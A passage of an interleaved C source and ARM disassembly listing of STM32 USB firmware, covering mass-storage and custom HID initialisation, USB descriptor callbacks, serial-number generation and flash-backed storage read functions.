 800c66c:	490f      	ldr	r1, [pc, #60]	; (800c6ac <MX_USB_DEVICE_Init_MSC+0x58>)
 800c66e:	480e      	ldr	r0, [pc, #56]	; (800c6a8 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c670:	f7fe fd5f 	bl	800b132 <USBD_RegisterClass>
 800c674:	4603      	mov	r3, r0
 800c676:	2b00      	cmp	r3, #0
 800c678:	d001      	beq.n	800c67e <MX_USB_DEVICE_Init_MSC+0x2a>
  {
    Error_Handler();
 800c67a:	f7f4 fc45 	bl	8000f08 <Error_Handler>
  }
  if (USBD_MSC_RegisterStorage(&hUsbDeviceFS_MSC, &USBD_Storage_Interface_fops_FS) != USBD_OK)
 800c67e:	490c      	ldr	r1, [pc, #48]	; (800c6b0 <MX_USB_DEVICE_Init_MSC+0x5c>)
 800c680:	4809      	ldr	r0, [pc, #36]	; (800c6a8 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c682:	f7fc ff27 	bl	80094d4 <USBD_MSC_RegisterStorage>
 800c686:	4603      	mov	r3, r0
 800c688:	2b00      	cmp	r3, #0
 800c68a:	d001      	beq.n	800c690 <MX_USB_DEVICE_Init_MSC+0x3c>
  {
    Error_Handler();
 800c68c:	f7f4 fc3c 	bl	8000f08 <Error_Handler>
  }
  if (USBD_Start(&hUsbDeviceFS_MSC) != USBD_OK)
 800c690:	4805      	ldr	r0, [pc, #20]	; (800c6a8 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c692:	f7fe fd84 	bl	800b19e <USBD_Start>
 800c696:	4603      	mov	r3, r0
 800c698:	2b00      	cmp	r3, #0
 800c69a:	d001      	beq.n	800c6a0 <MX_USB_DEVICE_Init_MSC+0x4c>
  {
    Error_Handler();
 800c69c:	f7f4 fc34 	bl	8000f08 <Error_Handler>
  }
  /* USER CODE BEGIN USB_DEVICE_Init_PostTreatment */

  /* USER CODE END USB_DEVICE_Init_PostTreatment */
}
 800c6a0:	bf00      	nop
 800c6a2:	bd80      	pop	{r7, pc}
 800c6a4:	200001ac 	.word	0x200001ac
 800c6a8:	2000069c 	.word	0x2000069c
 800c6ac:	200000a8 	.word	0x200000a8
 800c6b0:	20000220 	.word	0x20000220

0800c6b4 <CUSTOM_HID_Init_FS>:
/**
  * @brief  Initializes the CUSTOM HID media low layer
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_Init_FS(void)
{
 800c6b4:	b480      	push	{r7}
 800c6b6:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 4 */
  return (USBD_OK);
 800c6b8:	2300      	movs	r3, #0
  /* USER CODE END 4 */
}
 800c6ba:	4618      	mov	r0, r3
 800c6bc:	46bd      	mov	sp, r7
 800c6be:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c6c2:	4770      	bx	lr

0800c6c4 <CUSTOM_HID_DeInit_FS>:
/**
  * @brief  DeInitializes the CUSTOM HID media low layer
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_DeInit_FS(void)
{
 800c6c4:	b480      	push	{r7}
 800c6c6:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 5 */
  return (USBD_OK);
 800c6c8:	2300      	movs	r3, #0
  /* USER CODE END 5 */
}
 800c6ca:	4618      	mov	r0, r3
 800c6cc:	46bd      	mov	sp, r7
 800c6ce:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c6d2:	4770      	bx	lr

0800c6d4 <CUSTOM_HID_OutEvent_FS>:
  * @param  event_idx: Event index
  * @param  state: Event state
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_OutEvent_FS(uint8_t event_idx, uint8_t state)
{
 800c6d4:	b580      	push	{r7, lr}
 800c6d6:	b082      	sub	sp, #8
 800c6d8:	af00      	add	r7, sp, #0
 800c6da:	4603      	mov	r3, r0
 800c6dc:	460a      	mov	r2, r1
 800c6de:	71fb      	strb	r3, [r7, #7]
 800c6e0:	4613      	mov	r3, r2
 800c6e2:	71bb      	strb	r3, [r7, #6]
  /* USER CODE BEGIN 6 */
  UNUSED(event_idx);
  UNUSED(state);

  /* Start next USB packet transfer once data processing is completed */
  USBD_CUSTOM_HID_ReceivePacket(&hUsbDeviceFS);
 800c6e4:	4803      	ldr	r0, [pc, #12]	; (800c6f4 <CUSTOM_HID_OutEvent_FS+0x20>)
 800c6e6:	f7fc fbd1 	bl	8008e8c <USBD_CUSTOM_HID_ReceivePacket>

  return (USBD_OK);
 800c6ea:	2300      	movs	r3, #0
  /* USER CODE END 6 */
}
 800c6ec:	4618      	mov	r0, r3
 800c6ee:	3708      	adds	r7, #8
 800c6f0:	46bd      	mov	sp, r7
 800c6f2:	bd80      	pop	{r7, pc}
 800c6f4:	200003c0 	.word	0x200003c0

0800c6f8 <USBD_FS_DeviceDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_DeviceDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c6f8:	b480      	push	{r7}
 800c6fa:	b083      	sub	sp, #12
 800c6fc:	af00      	add	r7, sp, #0
 800c6fe:	4603      	mov	r3, r0
 800c700:	6039      	str	r1, [r7, #0]
 800c702:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_FS_DeviceDesc);
 800c704:	683b      	ldr	r3, [r7, #0]
 800c706:	2212      	movs	r2, #18
 800c708:	801a      	strh	r2, [r3, #0]
  if(isMSC == 1)
 800c70a:	4b06      	ldr	r3, [pc, #24]	; (800c724 <USBD_FS_DeviceDescriptor+0x2c>)
 800c70c:	681b      	ldr	r3, [r3, #0]
 800c70e:	2b01      	cmp	r3, #1
 800c710:	d101      	bne.n	800c716 <USBD_FS_DeviceDescriptor+0x1e>
	  return USBD_FS_DeviceDesc;
 800c712:	4b05      	ldr	r3, [pc, #20]	; (800c728 <USBD_FS_DeviceDescriptor+0x30>)
 800c714:	e000      	b.n	800c718 <USBD_FS_DeviceDescriptor+0x20>
  else
	  return USBD_FS_DeviceDesc_HID;
 800c716:	4b05      	ldr	r3, [pc, #20]	; (800c72c <USBD_FS_DeviceDescriptor+0x34>)
}
 800c718:	4618      	mov	r0, r3
 800c71a:	370c      	adds	r7, #12
 800c71c:	46bd      	mov	sp, r7
 800c71e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c722:	4770      	bx	lr
 800c724:	20000978 	.word	0x20000978
 800c728:	200001cc 	.word	0x200001cc
 800c72c:	200001e0 	.word	0x200001e0

0800c730 <USBD_FS_LangIDStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_LangIDStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c730:	b480      	push	{r7}
 800c732:	b083      	sub	sp, #12
 800c734:	af00      	add	r7, sp, #0
 800c736:	4603      	mov	r3, r0
 800c738:	6039      	str	r1, [r7, #0]
 800c73a:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_LangIDDesc);
 800c73c:	683b      	ldr	r3, [r7, #0]
 800c73e:	2204      	movs	r2, #4
 800c740:	801a      	strh	r2, [r3, #0]
  return USBD_LangIDDesc;
 800c742:	4b03      	ldr	r3, [pc, #12]	; (800c750 <USBD_FS_LangIDStrDescriptor+0x20>)
}
 800c744:	4618      	mov	r0, r3
 800c746:	370c      	adds	r7, #12
 800c748:	46bd      	mov	sp, r7
 800c74a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c74e:	4770      	bx	lr
 800c750:	20000200 	.word	0x20000200

0800c754 <USBD_FS_ProductStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ProductStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c754:	b580      	push	{r7, lr}
 800c756:	b082      	sub	sp, #8
 800c758:	af00      	add	r7, sp, #0
 800c75a:	4603      	mov	r3, r0
 800c75c:	6039      	str	r1, [r7, #0]
 800c75e:	71fb      	strb	r3, [r7, #7]
  if(speed == 0)
 800c760:	79fb      	ldrb	r3, [r7, #7]
 800c762:	2b00      	cmp	r3, #0
 800c764:	d105      	bne.n	800c772 <USBD_FS_ProductStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_PRODUCT_STRING_FS, USBD_StrDesc, length);
 800c766:	683a      	ldr	r2, [r7, #0]
 800c768:	4907      	ldr	r1, [pc, #28]	; (800c788 <USBD_FS_ProductStrDescriptor+0x34>)
 800c76a:	4808      	ldr	r0, [pc, #32]	; (800c78c <USBD_FS_ProductStrDescriptor+0x38>)
 800c76c:	f7ff fe62 	bl	800c434 <USBD_GetString>
 800c770:	e004      	b.n	800c77c <USBD_FS_ProductStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_PRODUCT_STRING_FS, USBD_StrDesc, length);
 800c772:	683a      	ldr	r2, [r7, #0]
 800c774:	4904      	ldr	r1, [pc, #16]	; (800c788 <USBD_FS_ProductStrDescriptor+0x34>)
 800c776:	4805      	ldr	r0, [pc, #20]	; (800c78c <USBD_FS_ProductStrDescriptor+0x38>)
 800c778:	f7ff fe5c 	bl	800c434 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c77c:	4b02      	ldr	r3, [pc, #8]	; (800c788 <USBD_FS_ProductStrDescriptor+0x34>)
}
 800c77e:	4618      	mov	r0, r3
 800c780:	3708      	adds	r7, #8
 800c782:	46bd      	mov	sp, r7
 800c784:	bd80      	pop	{r7, pc}
 800c786:	bf00      	nop
 800c788:	2000097c 	.word	0x2000097c
 800c78c:	0800d488 	.word	0x0800d488

0800c790 <USBD_FS_ManufacturerStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ManufacturerStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c790:	b580      	push	{r7, lr}
 800c792:	b082      	sub	sp, #8
 800c794:	af00      	add	r7, sp, #0
 800c796:	4603      	mov	r3, r0
 800c798:	6039      	str	r1, [r7, #0]
 800c79a:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  USBD_GetString((uint8_t *)USBD_MANUFACTURER_STRING, USBD_StrDesc, length);
 800c79c:	683a      	ldr	r2, [r7, #0]
 800c79e:	4904      	ldr	r1, [pc, #16]	; (800c7b0 <USBD_FS_ManufacturerStrDescriptor+0x20>)
 800c7a0:	4804      	ldr	r0, [pc, #16]	; (800c7b4 <USBD_FS_ManufacturerStrDescriptor+0x24>)
 800c7a2:	f7ff fe47 	bl	800c434 <USBD_GetString>
  return USBD_StrDesc;
 800c7a6:	4b02      	ldr	r3, [pc, #8]	; (800c7b0 <USBD_FS_ManufacturerStrDescriptor+0x20>)
}
 800c7a8:	4618      	mov	r0, r3
 800c7aa:	3708      	adds	r7, #8
 800c7ac:	46bd      	mov	sp, r7
 800c7ae:	bd80      	pop	{r7, pc}
 800c7b0:	2000097c 	.word	0x2000097c
 800c7b4:	0800d49c 	.word	0x0800d49c

0800c7b8 <USBD_FS_SerialStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_SerialStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c7b8:	b580      	push	{r7, lr}
 800c7ba:	b082      	sub	sp, #8
 800c7bc:	af00      	add	r7, sp, #0
 800c7be:	4603      	mov	r3, r0
 800c7c0:	6039      	str	r1, [r7, #0]
 800c7c2:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = USB_SIZ_STRING_SERIAL;
 800c7c4:	683b      	ldr	r3, [r7, #0]
 800c7c6:	221a      	movs	r2, #26
 800c7c8:	801a      	strh	r2, [r3, #0]

  /* Update the serial number string descriptor with the data from the unique
   * ID */
  Get_SerialNum();
 800c7ca:	f000 f855 	bl	800c878 <Get_SerialNum>
  /* USER CODE BEGIN USBD_FS_SerialStrDescriptor */

  /* USER CODE END USBD_FS_SerialStrDescriptor */
  return (uint8_t *) USBD_StringSerial;
 800c7ce:	4b02      	ldr	r3, [pc, #8]	; (800c7d8 <USBD_FS_SerialStrDescriptor+0x20>)
}
 800c7d0:	4618      	mov	r0, r3
 800c7d2:	3708      	adds	r7, #8
 800c7d4:	46bd      	mov	sp, r7
 800c7d6:	bd80      	pop	{r7, pc}
 800c7d8:	20000204 	.word	0x20000204

0800c7dc <USBD_FS_ConfigStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ConfigStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c7dc:	b580      	push	{r7, lr}
 800c7de:	b082      	sub	sp, #8
 800c7e0:	af00      	add	r7, sp, #0
 800c7e2:	4603      	mov	r3, r0
 800c7e4:	6039      	str	r1, [r7, #0]
 800c7e6:	71fb      	strb	r3, [r7, #7]
  if(speed == USBD_SPEED_HIGH)
 800c7e8:	79fb      	ldrb	r3, [r7, #7]
 800c7ea:	2b00      	cmp	r3, #0
 800c7ec:	d105      	bne.n	800c7fa <USBD_FS_ConfigStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_CONFIGURATION_STRING_FS, USBD_StrDesc, length);
 800c7ee:	683a      	ldr	r2, [r7, #0]
 800c7f0:	4907      	ldr	r1, [pc, #28]	; (800c810 <USBD_FS_ConfigStrDescriptor+0x34>)
 800c7f2:	4808      	ldr	r0, [pc, #32]	; (800c814 <USBD_FS_ConfigStrDescriptor+0x38>)
 800c7f4:	f7ff fe1e 	bl	800c434 <USBD_GetString>
 800c7f8:	e004      	b.n	800c804 <USBD_FS_ConfigStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_CONFIGURATION_STRING_FS, USBD_StrDesc, length);
 800c7fa:	683a      	ldr	r2, [r7, #0]
 800c7fc:	4904      	ldr	r1, [pc, #16]	; (800c810 <USBD_FS_ConfigStrDescriptor+0x34>)
 800c7fe:	4805      	ldr	r0, [pc, #20]	; (800c814 <USBD_FS_ConfigStrDescriptor+0x38>)
 800c800:	f7ff fe18 	bl	800c434 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c804:	4b02      	ldr	r3, [pc, #8]	; (800c810 <USBD_FS_ConfigStrDescriptor+0x34>)
}
 800c806:	4618      	mov	r0, r3
 800c808:	3708      	adds	r7, #8
 800c80a:	46bd      	mov	sp, r7
 800c80c:	bd80      	pop	{r7, pc}
 800c80e:	bf00      	nop
 800c810:	2000097c 	.word	0x2000097c
 800c814:	0800d4a0 	.word	0x0800d4a0

0800c818 <USBD_FS_InterfaceStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_InterfaceStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c818:	b580      	push	{r7, lr}
 800c81a:	b082      	sub	sp, #8
 800c81c:	af00      	add	r7, sp, #0
 800c81e:	4603      	mov	r3, r0
 800c820:	6039      	str	r1, [r7, #0]
 800c822:	71fb      	strb	r3, [r7, #7]
  if(speed == 0)
 800c824:	79fb      	ldrb	r3, [r7, #7]
 800c826:	2b00      	cmp	r3, #0
 800c828:	d105      	bne.n	800c836 <USBD_FS_InterfaceStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_INTERFACE_STRING_FS, USBD_StrDesc, length);
 800c82a:	683a      	ldr	r2, [r7, #0]
 800c82c:	4907      	ldr	r1, [pc, #28]	; (800c84c <USBD_FS_InterfaceStrDescriptor+0x34>)
 800c82e:	4808      	ldr	r0, [pc, #32]	; (800c850 <USBD_FS_InterfaceStrDescriptor+0x38>)
 800c830:	f7ff fe00 	bl	800c434 <USBD_GetString>
 800c834:	e004      	b.n	800c840 <USBD_FS_InterfaceStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_INTERFACE_STRING_FS, USBD_StrDesc, length);
 800c836:	683a      	ldr	r2, [r7, #0]
 800c838:	4904      	ldr	r1, [pc, #16]	; (800c84c <USBD_FS_InterfaceStrDescriptor+0x34>)
 800c83a:	4805      	ldr	r0, [pc, #20]	; (800c850 <USBD_FS_InterfaceStrDescriptor+0x38>)
 800c83c:	f7ff fdfa 	bl	800c434 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c840:	4b02      	ldr	r3, [pc, #8]	; (800c84c <USBD_FS_InterfaceStrDescriptor+0x34>)
}
 800c842:	4618      	mov	r0, r3
 800c844:	3708      	adds	r7, #8
 800c846:	46bd      	mov	sp, r7
 800c848:	bd80      	pop	{r7, pc}
 800c84a:	bf00      	nop
 800c84c:	2000097c 	.word	0x2000097c
 800c850:	0800d4ac 	.word	0x0800d4ac

0800c854 <USBD_FS_USR_BOSDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_USR_BOSDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c854:	b480      	push	{r7}
 800c856:	b083      	sub	sp, #12
 800c858:	af00      	add	r7, sp, #0
 800c85a:	4603      	mov	r3, r0
 800c85c:	6039      	str	r1, [r7, #0]
 800c85e:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_FS_BOSDesc);
 800c860:	683b      	ldr	r3, [r7, #0]
 800c862:	220c      	movs	r2, #12
 800c864:	801a      	strh	r2, [r3, #0]
  return (uint8_t*)USBD_FS_BOSDesc;
 800c866:	4b03      	ldr	r3, [pc, #12]	; (800c874 <USBD_FS_USR_BOSDescriptor+0x20>)
}
 800c868:	4618      	mov	r0, r3
 800c86a:	370c      	adds	r7, #12
 800c86c:	46bd      	mov	sp, r7
 800c86e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c872:	4770      	bx	lr
 800c874:	200001f4 	.word	0x200001f4

0800c878 <Get_SerialNum>:
  * @brief  Create the serial number string descriptor
  * @param  None
  * @retval None
  */
static void Get_SerialNum(void)
{
 800c878:	b580      	push	{r7, lr}
 800c87a:	b084      	sub	sp, #16
 800c87c:	af00      	add	r7, sp, #0
  uint32_t deviceserial0;
  uint32_t deviceserial1;
  uint32_t deviceserial2;

  deviceserial0 = *(uint32_t *) DEVICE_ID1;
 800c87e:	4b0f      	ldr	r3, [pc, #60]	; (800c8bc <Get_SerialNum+0x44>)
 800c880:	681b      	ldr	r3, [r3, #0]
 800c882:	60fb      	str	r3, [r7, #12]
  deviceserial1 = *(uint32_t *) DEVICE_ID2;
 800c884:	4b0e      	ldr	r3, [pc, #56]	; (800c8c0 <Get_SerialNum+0x48>)
 800c886:	681b      	ldr	r3, [r3, #0]
 800c888:	60bb      	str	r3, [r7, #8]
  deviceserial2 = *(uint32_t *) DEVICE_ID3;
 800c88a:	4b0e      	ldr	r3, [pc, #56]	; (800c8c4 <Get_SerialNum+0x4c>)
 800c88c:	681b      	ldr	r3, [r3, #0]
 800c88e:	607b      	str	r3, [r7, #4]

  deviceserial0 += deviceserial2;
 800c890:	68fa      	ldr	r2, [r7, #12]
 800c892:	687b      	ldr	r3, [r7, #4]
 800c894:	4413      	add	r3, r2
 800c896:	60fb      	str	r3, [r7, #12]

  if (deviceserial0 != 0)
 800c898:	68fb      	ldr	r3, [r7, #12]
 800c89a:	2b00      	cmp	r3, #0
 800c89c:	d009      	beq.n	800c8b2 <Get_SerialNum+0x3a>
  {
    IntToUnicode(deviceserial0, &USBD_StringSerial[2], 8);
 800c89e:	2208      	movs	r2, #8
 800c8a0:	4909      	ldr	r1, [pc, #36]	; (800c8c8 <Get_SerialNum+0x50>)
 800c8a2:	68f8      	ldr	r0, [r7, #12]
 800c8a4:	f000 f814 	bl	800c8d0 <IntToUnicode>
    IntToUnicode(deviceserial1, &USBD_StringSerial[18], 4);
 800c8a8:	2204      	movs	r2, #4
 800c8aa:	4908      	ldr	r1, [pc, #32]	; (800c8cc <Get_SerialNum+0x54>)
 800c8ac:	68b8      	ldr	r0, [r7, #8]
 800c8ae:	f000 f80f 	bl	800c8d0 <IntToUnicode>
  }
}
 800c8b2:	bf00      	nop
 800c8b4:	3710      	adds	r7, #16
 800c8b6:	46bd      	mov	sp, r7
 800c8b8:	bd80      	pop	{r7, pc}
 800c8ba:	bf00      	nop
 800c8bc:	1fff7590 	.word	0x1fff7590
 800c8c0:	1fff7594 	.word	0x1fff7594
 800c8c4:	1fff7598 	.word	0x1fff7598
 800c8c8:	20000206 	.word	0x20000206
 800c8cc:	20000216 	.word	0x20000216

0800c8d0 <IntToUnicode>:
  * @param  pbuf: pointer to the buffer
  * @param  len: buffer length
  * @retval None
  */
static void IntToUnicode(uint32_t value, uint8_t * pbuf, uint8_t len)
{
 800c8d0:	b480      	push	{r7}
 800c8d2:	b087      	sub	sp, #28
 800c8d4:	af00      	add	r7, sp, #0
 800c8d6:	60f8      	str	r0, [r7, #12]
 800c8d8:	60b9      	str	r1, [r7, #8]
 800c8da:	4613      	mov	r3, r2
 800c8dc:	71fb      	strb	r3, [r7, #7]
  uint8_t idx = 0;
 800c8de:	2300      	movs	r3, #0
 800c8e0:	75fb      	strb	r3, [r7, #23]

  for (idx = 0; idx < len; idx++)
 800c8e2:	2300      	movs	r3, #0
 800c8e4:	75fb      	strb	r3, [r7, #23]
 800c8e6:	e027      	b.n	800c938 <IntToUnicode+0x68>
  {
    if (((value >> 28)) < 0xA)
 800c8e8:	68fb      	ldr	r3, [r7, #12]
 800c8ea:	0f1b      	lsrs	r3, r3, #28
 800c8ec:	2b09      	cmp	r3, #9
 800c8ee:	d80b      	bhi.n	800c908 <IntToUnicode+0x38>
    {
      pbuf[2 * idx] = (value >> 28) + '0';
 800c8f0:	68fb      	ldr	r3, [r7, #12]
 800c8f2:	0f1b      	lsrs	r3, r3, #28
 800c8f4:	b2da      	uxtb	r2, r3
 800c8f6:	7dfb      	ldrb	r3, [r7, #23]
 800c8f8:	005b      	lsls	r3, r3, #1
 800c8fa:	4619      	mov	r1, r3
 800c8fc:	68bb      	ldr	r3, [r7, #8]
 800c8fe:	440b      	add	r3, r1
 800c900:	3230      	adds	r2, #48	; 0x30
 800c902:	b2d2      	uxtb	r2, r2
 800c904:	701a      	strb	r2, [r3, #0]
 800c906:	e00a      	b.n	800c91e <IntToUnicode+0x4e>
    }
    else
    {
      pbuf[2 * idx] = (value >> 28) + 'A' - 10;
 800c908:	68fb      	ldr	r3, [r7, #12]
 800c90a:	0f1b      	lsrs	r3, r3, #28
 800c90c:	b2da      	uxtb	r2, r3
 800c90e:	7dfb      	ldrb	r3, [r7, #23]
 800c910:	005b      	lsls	r3, r3, #1
 800c912:	4619      	mov	r1, r3
 800c914:	68bb      	ldr	r3, [r7, #8]
 800c916:	440b      	add	r3, r1
 800c918:	3237      	adds	r2, #55	; 0x37
 800c91a:	b2d2      	uxtb	r2, r2
 800c91c:	701a      	strb	r2, [r3, #0]
    }

    value = value << 4;
 800c91e:	68fb      	ldr	r3, [r7, #12]
 800c920:	011b      	lsls	r3, r3, #4
 800c922:	60fb      	str	r3, [r7, #12]

    pbuf[2 * idx + 1] = 0;
 800c924:	7dfb      	ldrb	r3, [r7, #23]
 800c926:	005b      	lsls	r3, r3, #1
 800c928:	3301      	adds	r3, #1
 800c92a:	68ba      	ldr	r2, [r7, #8]
 800c92c:	4413      	add	r3, r2
 800c92e:	2200      	movs	r2, #0
 800c930:	701a      	strb	r2, [r3, #0]
  for (idx = 0; idx < len; idx++)
 800c932:	7dfb      	ldrb	r3, [r7, #23]
 800c934:	3301      	adds	r3, #1
 800c936:	75fb      	strb	r3, [r7, #23]
 800c938:	7dfa      	ldrb	r2, [r7, #23]
 800c93a:	79fb      	ldrb	r3, [r7, #7]
 800c93c:	429a      	cmp	r2, r3
 800c93e:	d3d3      	bcc.n	800c8e8 <IntToUnicode+0x18>
  }
}
 800c940:	bf00      	nop
 800c942:	bf00      	nop
 800c944:	371c      	adds	r7, #28
 800c946:	46bd      	mov	sp, r7
 800c948:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c94c:	4770      	bx	lr

0800c94e <STORAGE_Init_FS>:
  * @brief  Initializes over USB FS IP
  * @param  lun:
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Init_FS(uint8_t lun)
{
 800c94e:	b480      	push	{r7}
 800c950:	b083      	sub	sp, #12
 800c952:	af00      	add	r7, sp, #0
 800c954:	4603      	mov	r3, r0
 800c956:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 2 */
  return (USBD_OK);
 800c958:	2300      	movs	r3, #0
  /* USER CODE END 2 */
}
 800c95a:	4618      	mov	r0, r3
 800c95c:	370c      	adds	r7, #12
 800c95e:	46bd      	mov	sp, r7
 800c960:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c964:	4770      	bx	lr

0800c966 <STORAGE_GetCapacity_FS>:
  * @param  block_num: .
  * @param  block_size: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_GetCapacity_FS(uint8_t lun, uint32_t *block_num, uint16_t *block_size)
{
 800c966:	b480      	push	{r7}
 800c968:	b085      	sub	sp, #20
 800c96a:	af00      	add	r7, sp, #0
 800c96c:	4603      	mov	r3, r0
 800c96e:	60b9      	str	r1, [r7, #8]
 800c970:	607a      	str	r2, [r7, #4]
 800c972:	73fb      	strb	r3, [r7, #15]
  /* USER CODE BEGIN 3 */
	*block_num  = FLASH_PAGE_NBR;
 800c974:	68bb      	ldr	r3, [r7, #8]
 800c976:	2240      	movs	r2, #64	; 0x40
 800c978:	601a      	str	r2, [r3, #0]
	*block_size = FLASH_PAGE_SIZE;
 800c97a:	687b      	ldr	r3, [r7, #4]
 800c97c:	f44f 6200 	mov.w	r2, #2048	; 0x800
 800c980:	801a      	strh	r2, [r3, #0]
  return (USBD_OK);
 800c982:	2300      	movs	r3, #0
  /* USER CODE END 3 */
}
 800c984:	4618      	mov	r0, r3
 800c986:	3714      	adds	r7, #20
 800c988:	46bd      	mov	sp, r7
 800c98a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c98e:	4770      	bx	lr

0800c990 <STORAGE_IsReady_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_IsReady_FS(uint8_t lun)
{
 800c990:	b480      	push	{r7}
 800c992:	b083      	sub	sp, #12
 800c994:	af00      	add	r7, sp, #0
 800c996:	4603      	mov	r3, r0
 800c998:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 4 */
  return (USBD_OK);
 800c99a:	2300      	movs	r3, #0
  /* USER CODE END 4 */
}
 800c99c:	4618      	mov	r0, r3
 800c99e:	370c      	adds	r7, #12
 800c9a0:	46bd      	mov	sp, r7
 800c9a2:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c9a6:	4770      	bx	lr

0800c9a8 <STORAGE_IsWriteProtected_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_IsWriteProtected_FS(uint8_t lun)
{
 800c9a8:	b480      	push	{r7}
 800c9aa:	b083      	sub	sp, #12
 800c9ac:	af00      	add	r7, sp, #0
 800c9ae:	4603      	mov	r3, r0
 800c9b0:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 5 */
  return (USBD_OK);
 800c9b2:	2300      	movs	r3, #0
  /* USER CODE END 5 */
}
 800c9b4:	4618      	mov	r0, r3
 800c9b6:	370c      	adds	r7, #12
 800c9b8:	46bd      	mov	sp, r7
 800c9ba:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c9be:	4770      	bx	lr

0800c9c0 <STORAGE_Read_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Read_FS(uint8_t lun, uint8_t *buf, uint32_t blk_addr, uint16_t blk_len)
{
 800c9c0:	b580      	push	{r7, lr}
 800c9c2:	b084      	sub	sp, #16
 800c9c4:	af00      	add	r7, sp, #0
 800c9c6:	60b9      	str	r1, [r7, #8]
 800c9c8:	607a      	str	r2, [r7, #4]
 800c9ca:	461a      	mov	r2, r3
 800c9cc:	4603      	mov	r3, r0
 800c9ce:	73fb      	strb	r3, [r7, #15]
 800c9d0:	4613      	mov	r3, r2
 800c9d2:	81bb      	strh	r3, [r7, #12]
  /* USER CODE BEGIN 6 */
	if(lun == 0){
 800c9d4:	7bfb      	ldrb	r3, [r7, #15]
 800c9d6:	2b00      	cmp	r3, #0
 800c9d8:	d10d      	bne.n	800c9f6 <STORAGE_Read_FS+0x36>
		memcpy(buf, (uint8_t*)(FLASH_START_ADDR + blk_addr * FLASH_PAGE_SIZE), blk_len * FLASH_PAGE_SIZE);
 800c9da:	687b      	ldr	r3, [r7, #4]
 800c9dc:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c9e0:	3340      	adds	r3, #64	; 0x40
 800c9e2:	02db      	lsls	r3, r3, #11
 800c9e4:	4619      	mov	r1, r3
 800c9e6:	89bb      	ldrh	r3, [r7, #12]
 800c9e8:	02db      	lsls	r3, r3, #11
 800c9ea:	461a      	mov	r2, r3
 800c9ec:	68b8      	ldr	r0, [r7, #8]
 800c9ee:	f000 fc65 	bl	800d2bc <memcpy>
		return (USBD_OK);
 800c9f2:	2300      	movs	r3, #0
 800c9f4:	e000      	b.n	800c9f8 <STORAGE_Read_FS+0x38>
	}
